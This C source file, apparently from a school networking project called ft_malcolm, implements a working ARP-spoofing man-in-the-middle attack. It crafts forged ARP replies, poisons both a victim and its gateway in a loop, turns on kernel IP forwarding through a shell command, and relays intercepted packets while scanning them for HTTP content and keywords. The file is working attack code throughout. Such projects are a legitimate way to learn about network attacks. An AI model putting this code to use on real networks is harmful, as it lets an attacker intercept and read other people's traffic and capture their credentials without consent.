#include "ft_malcolm.h"
#include <net/if.h>

int wait_for_arp_request(int sockfd, t_args *args, bool verbose)
{
	unsigned char buffer[2048];
	ssize_t		  bytes;

	printf("[Info] Waiting for ARP request for %s...\n", args->source_ip);

	while (1)
	{
		bytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			perror("recvfrom");
			return (1);
		}

		uint16_t ethertype = ntohs(*(uint16_t *)(buffer + 12));
		if (ethertype != ETH_P_ARP)
			continue;
		if (bytes < 42)
			continue; // ARP packet must be at least 42 bytes

		uint16_t opcode
			= ntohs(*(uint16_t *)(buffer + 14 + 6)); // ARP header + opcode
		if (opcode == 1)							 // ARP request
		{
			const unsigned char *target_ip
				= buffer + 14 + 24; // ARP header offset for target IP
			char ip_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, target_ip, ip_str, sizeof(ip_str));

			if (ft_strcmp(ip_str, args->source_ip) == 0)
			{
				printf("[Info] ARP request received for %s, target reached.\n",
					   args->source_ip);
				if (verbose)
					print_arp_packet(buffer, bytes);
				return (0);
			}
		}
	}
	return (1); // in theory, this should never happen
}

void parse_mac(const char *str, uint8_t mac[6])
{
	sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2],
		   &mac[3], &mac[4], &mac[5]);
}

void send_arp_packet(int sockfd, t_args *args, const char *sender_mac,
					 const char *spoofed_ip, const char *target_mac,
					 const char *target_ip)
{
	static int	  sent_packet_count = 0;
	unsigned char packet[42];

	// === Ethernet Header ===
	unsigned char *eth = packet;
	unsigned char *arp = packet + 14;

	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[0], &eth[1],
		   &eth[2], &eth[3], &eth[4], &eth[5]);

	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[6], &eth[7],
		   &eth[8], &eth[9], &eth[10], &eth[11]);

	eth[12] = 0x08; // ARP type
	eth[13] = 0x06;

	// === ARP Header ===
	ft_memset(arp, 0, 28);
	arp[0] = 0x00;
	arp[1] = 0x01; // Hardware type: Ethernet
	arp[2] = 0x08;
	arp[3] = 0x00; // Protocol type: IPv4
	arp[4] = 6;	   // Hardware address size
	arp[5] = 4;	   // Protocol address size
	arp[6] = 0x00;
	arp[7] = 0x02; // Opcode: reply (2)

	// Sender MAC
	sscanf(sender_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[8], &arp[9],
		   &arp[10], &arp[11], &arp[12], &arp[13]);

	// Sender IP
	inet_pton(AF_INET, spoofed_ip, &arp[14]);

	// Target MAC
	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[18], &arp[19],
		   &arp[20], &arp[21], &arp[22], &arp[23]);

	// Target IP
	inet_pton(AF_INET, target_ip, &arp[24]);

	// === Send packet ===
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(args->ifname);
	sll.sll_halen = ETH_ALEN;

	uint8_t dest_mac[6];
	parse_mac(target_mac, dest_mac);
	ft_memcpy(sll.sll_addr, dest_mac, 6);

	if (sendto(sockfd, packet, 42, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
	{
		perror("sendto ARP packet");
		return;
	}

	sent_packet_count++;

	// Only display packet details for non-poison packets (regular ARP replies)
	// Poison packets will be displayed by send_arp_poison function
}

void send_arp_reply(int sockfd, t_args *args)
{
	send_arp_packet(sockfd, args, args->source_mac, args->source_ip,
					args->target_mac, args->target_ip);

	// Show detailed packet information in verbose mode
	if (args->verbose)
		print_sent_arp_reply(args);
	else
		printf(COLOR_GREEN
			   "[Info] ARP reply sent to target (%s).\n" COLOR_RESET,
			   args->target_ip);
}

void send_arp_poison(int sockfd, t_args *args, const char *spoofed_ip,
					 const char *target_ip, const char *target_mac)
{
	static int poison_packet_count = 0;

	send_arp_packet(sockfd, args, args->source_mac, spoofed_ip, target_mac,
					target_ip);

	poison_packet_count++;

	// Only display detailed packet information every 10th packet to reduce spam
	if (args->verbose
		&& (poison_packet_count % 10 == 1 || poison_packet_count % 10 == 2))
	{
		const char *direction;
		if (ft_strcmp(target_ip, args->target_ip) == 0)
			direction = "To Target";
		else
			direction = "To Gateway";

		print_sent_arp_poison(args, spoofed_ip, target_ip, target_mac,
							  poison_packet_count, direction);
	}
	else if (args->verbose && poison_packet_count % 10 == 0)
	{
		// Show a simple message every 10th packet
		const char *direction
			= ft_strcmp(target_ip, args->target_ip) == 0 ? "Target" : "Gateway";
		printf(COLOR_YELLOW "[Poison #%d] %s -> %s\n" COLOR_RESET,
			   poison_packet_count, direction, spoofed_ip);
	}
}

void *traffic_forwarding_thread(void *arg)
{
	t_forward_args *fargs = (t_forward_args *)arg;
	unsigned char	buffer[2048];
	ssize_t			bytes;

	printf(COLOR_YELLOW
		   "[Info] Traffic forwarding thread started...\n" COLOR_RESET);

	while (1)
	{
		bytes = recvfrom(fargs->sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			perror("recvfrom in forwarding thread");
			continue;
		}

		// Check packet type and display immediately if verbose
		uint16_t ethertype = ntohs(*(uint16_t *)(buffer + 12));

		if (fargs->args->verbose)
		{
			if (ethertype == ETH_P_ARP)
			{
				// Check if it's a request or reply
				uint16_t opcode = ntohs(*(uint16_t *)(buffer + 14 + 6));
				if (opcode == 1)
				{
					printf(COLOR_GREEN
						   "====================== ARP Request Received "
						   "======================\n" COLOR_RESET);
				}
				else if (opcode == 2)
				{
					printf(COLOR_GREEN
						   "====================== ARP Reply Received "
						   "======================\n" COLOR_RESET);
				}
				else
				{
					printf(COLOR_GREEN
						   "====================== ARP Packet Received "
						   "======================\n" COLOR_RESET);
				}
				print_arp_packet(buffer, bytes);
			}
			else if (ethertype == ETH_P_IP)
			{
				// Extract source and destination IPs from IP header
				const unsigned char *ip_header = buffer + 14;
				const unsigned char *src_ip = ip_header + 12;
				const unsigned char *dst_ip = ip_header + 16;

				char src_ip_str[INET_ADDRSTRLEN];
				char dst_ip_str[INET_ADDRSTRLEN];
				inet_ntop(AF_INET, src_ip, src_ip_str, sizeof(src_ip_str));
				inet_ntop(AF_INET, dst_ip, dst_ip_str, sizeof(dst_ip_str));

				printf(
					COLOR_CYAN
					"[Received] IP packet: %s -> %s (%zd bytes)\n" COLOR_RESET,
					src_ip_str, dst_ip_str, bytes);
			}
		}

		// Check if this is an IP packet to forward
		if (ethertype == ETH_P_IP)
		{
			// Extract source and destination IPs from IP header
			const unsigned char *ip_header = buffer + 14;
			const unsigned char *src_ip = ip_header + 12;
			const unsigned char *dst_ip = ip_header + 16;

			char src_ip_str[INET_ADDRSTRLEN];
			char dst_ip_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, src_ip, src_ip_str, sizeof(src_ip_str));
			inet_ntop(AF_INET, dst_ip, dst_ip_str, sizeof(dst_ip_str));

			// Forward traffic between our targets
			if ((ft_strcmp(src_ip_str, fargs->args->source_ip) == 0
				 && ft_strcmp(dst_ip_str, fargs->args->target_ip) == 0)
				|| (ft_strcmp(src_ip_str, fargs->args->target_ip) == 0
					&& ft_strcmp(dst_ip_str, fargs->args->source_ip) == 0))
			{
				if (fargs->args->verbose)
				{
					printf(COLOR_YELLOW
						   "[Forward] %s -> %s (%zd bytes)\n" COLOR_RESET,
						   src_ip_str, dst_ip_str, bytes);
				}

				// MITM ANALYSIS: Analyze HTTP traffic for demonstration
				analyze_http_traffic(buffer, bytes);
				search_keywords_in_traffic(buffer, bytes);

				// Modify destination MAC to forward properly
				if (ft_strcmp(dst_ip_str, fargs->args->source_ip) == 0)
				{
					// Forward to source
					sscanf(fargs->args->source_mac,
						   "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[0],
						   &buffer[1], &buffer[2], &buffer[3], &buffer[4],
						   &buffer[5]);
				}
				else
				{
					// Forward to target
					sscanf(fargs->args->target_mac,
						   "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[0],
						   &buffer[1], &buffer[2], &buffer[3], &buffer[4],
						   &buffer[5]);
				}

				// Send the modified packet
				struct sockaddr_ll sll;
				ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
				sll.sll_family = AF_PACKET;
				sll.sll_ifindex = if_nametoindex(fargs->args->ifname);
				sll.sll_halen = ETH_ALEN;
				ft_memcpy(sll.sll_addr, buffer, 6); // destination MAC

				sendto(fargs->sockfd, buffer, bytes, 0, (struct sockaddr *)&sll,
					   sizeof(sll));
			}
		}
	}
	return NULL;
}

void perform_mitm_attack(int sockfd, t_args *args)
{
	pthread_t	   forward_thread;
	t_forward_args fargs = { sockfd, args };

	// Use provided MAC address (required for attack mode)
	printf(COLOR_GREEN
		   "[Info] Starting Man-in-the-Middle Attack!\n" COLOR_RESET);
	printf(COLOR_YELLOW "[Info] Source IP to spoof: %s (MAC: %s)\n" COLOR_RESET,
		   args->source_ip, args->source_ip_mac);
	printf(COLOR_YELLOW "[Info] Target victim: %s (%s)\n" COLOR_RESET,
		   args->target_ip, args->target_mac);
	printf(COLOR_YELLOW "[Info] Attacker MAC: %s\n" COLOR_RESET,
		   args->source_mac);
	printf(COLOR_YELLOW "[Info] Interface: %s\n" COLOR_RESET, args->ifname);
	printf(COLOR_GREEN
		   "[Info] Press Ctrl+C to stop the attack.\n\n" COLOR_RESET);

	// Enable IP forwarding (if possible)
	system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");

	// Start traffic forwarding thread
	if (pthread_create(&forward_thread, NULL, traffic_forwarding_thread, &fargs)
		!= 0)
	{
		perror("pthread_create");
		return;
	}

	// Main loop for ARP poisoning
	int counter = 0;
	int packets_in_window = 0;
	int cycles_in_window = 0;

	while (1)
	{
		// poison the TARGET to think we are the SOURCE
		send_arp_poison(sockfd, args, args->source_ip, args->target_ip,
						args->target_mac);

		// poison the SOURCE to think we are the TARGET
		send_arp_poison(sockfd, args, args->target_ip, args->source_ip,
						args->source_ip_mac);

		counter++;
		packets_in_window
			+= 2; // Always 2 packets since source_ip_mac is mandatory
		cycles_in_window++;

		// Display attack summary every 10 packets (5 cycles * 2 packets = 10
		// packets)
		if (cycles_in_window >= 5)
		{
			if (args->verbose)
			{
				print_attack_summary(counter * 2, packets_in_window);
				print_traffic_statistics(); // Show MITM interception stats
			}
			else
			{
				printf(COLOR_GREEN "[Info] %d ARP packets sent in last 10s "
								   "(total: %d)\n" COLOR_RESET,
					   packets_in_window, counter * 2);
				print_traffic_statistics(); // Show MITM interception stats
			}

			// Reset the window
			packets_in_window = 0;
			cycles_in_window = 0;
		}
		else if (!args->verbose && counter % 5 == 0)
		{
			// Show simple progress every 10 packets in non-verbose mode
			printf(
				COLOR_CYAN
				"[Attack] Cycle %d completed (%d packets sent)\n" COLOR_RESET,
				counter, counter * 2);
		}

		// Send poisoning packets every 2 seconds
		sleep(2);
	}

	// This will never be reached due to signal handlers, but good practice
	pthread_cancel(forward_thread);
	pthread_join(forward_thread, NULL);
}
